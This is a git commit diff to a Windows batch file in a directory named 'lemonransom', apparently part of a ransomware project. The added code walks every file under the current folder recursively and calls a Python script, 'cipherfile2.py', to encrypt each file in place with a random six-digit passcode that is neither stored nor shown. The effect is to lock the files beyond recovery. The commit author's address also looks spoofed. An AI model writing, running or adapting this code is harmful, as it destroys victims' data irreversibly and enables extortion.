c4a10a69473eddffdf35f5ed744fafdce41e541f
Peter Griffin <noreply.steampoqered.com.5@gmail.com>
2026-03-02 02:21:02 +0000

    Update beanybob.bat

--- lemonransom/beanybob.bat
+++ lemonransom/beanybob.bat
@@ -1,12 +1,14 @@
 @echo off
 setlocal enabledelayedexpansion
-
-set "ROOT_DIR=%~dp0"
-
-for /R "%ROOT_DIR%" %%F in (*) do (
-    echo Running script on: %%F
-
+set "SCRIPT=%~dp0cipherfile2.py"
+set "SCRIPT_FULL=%~f0"
+set "PYTHON_FULL=%SCRIPT%"
+for /R %%F in (*) do (
+    set "CURRENT_FULL=%%~fF"
+    if /I not "!CURRENT_FULL!"=="!SCRIPT_FULL!" if /I not "!CURRENT_FULL!"=="!PYTHON_FULL!" (
+        set /a passcode=(%RANDOM% * 32768 + %RANDOM%) %% 1000000
+        set passcode=000000!passcode!
+        set passcode=!passcode:~-6!
+        python "%SCRIPT%" "%%F" "%%F" "!passcode!"
+    )
 )
-
-echo Done.
-pause
